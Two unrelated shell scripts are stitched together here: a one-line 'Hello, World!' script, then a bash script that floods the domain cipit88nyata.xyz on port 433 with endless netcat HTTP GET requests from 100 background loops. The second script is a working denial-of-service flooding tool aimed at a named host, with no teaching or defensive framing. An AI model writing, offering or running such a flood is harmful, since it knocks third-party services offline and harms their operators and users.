#!/system/bin/sh

echo Hello, World!
#!/bin/bash

# Target IP and port
target_ip="cipit88nyata.xyz"
target_port=433

# Number of threads
num_threads=100

# Function to send HTTP GET requests
function flood() {
  while true; do
    (echo -e "GET / HTTP/1.1\r\nHost: $target_ip:$target_port\r\n\r\n") | nc $target_ip $target_port &
  done
}

# Start multiple threads to flood the target
for i in $(seq 1 $num_threads); do
  flood &
done

wait
